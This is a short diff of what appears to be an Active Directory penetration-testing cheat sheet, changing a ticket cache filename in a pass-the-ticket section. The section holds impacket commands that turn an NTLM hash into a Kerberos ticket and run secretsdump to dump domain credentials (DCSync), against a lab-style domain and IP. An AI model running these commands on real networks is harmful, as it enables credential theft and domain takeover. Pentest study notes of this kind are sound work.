@@ -516,7 +516,7 @@ impacket-secretsdump -outputfile dcsync.txt -hashes :1a06b4248879e68a498d3bac51b
 
 # Pass-the-Ticket
 impacket-getTGT -dc-ip 172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 'vorkharium.com/john@172.16.150.10'
-export KRB5CCNAME='username.ccache'
+export KRB5CCNAME='john.ccache'
 impacket-secretsdump -k -outputfile dcsync.txt "vorkharium.com/john:'Password123!'@172.16.150.10"
 ```
 ### Remote Credential Dumping
